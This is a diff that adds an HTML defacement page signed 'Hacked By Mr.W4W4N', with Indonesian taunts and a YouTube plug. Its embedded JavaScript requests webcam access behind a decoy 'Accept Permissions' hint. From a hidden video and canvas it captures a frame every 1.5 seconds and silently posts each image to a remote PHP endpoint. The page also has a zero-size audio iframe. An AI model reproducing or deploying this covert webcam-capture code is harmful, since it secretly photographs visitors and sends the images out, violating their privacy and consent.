@@ -1,0 +1,100 @@
+<!doctype html>
+<html>
+<head>
+<title>Mr.W4W4N</title>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<H1> >>Hacked By<font color="gold"> Mr.W4W4N <font color="#708090"><< </H1>
+<br><font color="#FF0000">Gwe Mau Foto Lo, <font color="#FFD700">Jangan Lupa Senyum Manis</span></h1>
+<br><font color="#708090"> Jangan Lupa Subsribe Youtube Mr.W4W4N Channel </span></h1>
+<br><font color="#708090">Karena <font color="#FF0000">Subacribe <font color="#708090">Itu Gratis</span></h1>
+</h1>
+<br><font color="#708090"> Youtuber Hacker <font color="#FFD700">Jakarta </span></h1>
+<br><font color="#708090"> Bukan Hacker !!!! </span></h1>
+<br><font color="#708090">We  Not <font color="#FFD700">Criminals</span></h1>
+<br><font color="#708090">we are <font color="#FFD700">World Heroes</span></h1>
+<br><font color="#708090">We Secure the <font color="#FFD700">System</span></h1>
+
+
+
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </body>
+
+<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/305627026/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder>
+
+</html>
